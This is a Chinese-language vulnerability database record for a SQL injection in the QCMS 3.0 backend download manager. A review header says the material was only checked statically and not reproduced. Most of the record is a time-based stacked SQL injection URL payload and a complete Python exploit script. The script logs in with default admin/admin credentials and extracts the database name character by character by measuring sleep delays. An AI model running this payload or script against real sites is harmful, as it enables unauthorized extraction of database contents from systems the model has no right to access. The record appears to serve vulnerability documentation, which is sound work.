---
source: "hatch 补库批 20260928"
product: "QCMS3.0"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "QCMS 3.0 sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：后台下载管理登录；DB驱动允许所示堆叠语句，时间侧信道"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-343e4694c672b0270c2e232e"
entity_id: "ve-343e4694c672b0270c2e232e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台下载管理登录；DB驱动允许所示堆叠语句，时间侧信道

- **凭据与会话边界（1）**：标题未列后台而正文脚本admin/admin登录，默认凭据仅实验。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **凭据与会话边界（2）**：getCookie取登录最终response.cookies可能漏session初始Cookie，未验证登录成功。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **证据待核（3）**：仅固定10位/字符48–122、5秒阈值无基线/超时；实际堆叠执行能力缺源码验证。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# QCMS 3.0 sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

QCMS 3.0

三、复现过程
------------

在后台下载管理处

![](./.resource/QCMS3.0sql注入漏洞/media/rId24.png)

构造payload

    http://www.0-sec.org/backend/down.html?title=1';select if(ascii(substr((select database()), 1, 1))-113, 1, sleep(5));%23

这里直接附上简单脚本

    # !/usr/bin/python3
    # -*- coding:utf-8 -*-
    # author: Forthrglory
    import requests

    def getCookie():
        url = 'http://127.0.0.1/admin.php'
        data = {
            'username':'admin',
            'password':'admin'
        }

        session = requests.session()
        res = session.post(url, data)

        return requests.utils.dict_from_cookiejar(res.cookies)

    def getDatabase(url, arr, cookies):

        str = ''
        requests.session()

        for i in range(1, 11):
            for j in arr:
                data = url + '?title=1\';select if(ascii(substr((select database()), %s, 1))-%s, 1, sleep(5));%%23' % (i, ord(j))
                # print(data)
                res = requests.get(url=data, cookies=cookies)
                # print(res.elapsed.total_seconds())
                if(res.elapsed.total_seconds() > 5):
                    str += j
                    print(str)
                    break
        print('database=' + str)


    if __name__ == '__main__':
        url = 'http://127.0.0.1/backend/down.html'
        arr = []

        for i in range(48, 123):
            arr.append(chr(i))

        cookies = getCookie()
        print(cookies)
        getDatabase(url, arr, cookies)

参考链接
--------

> https://xz.aliyun.com/t/7269
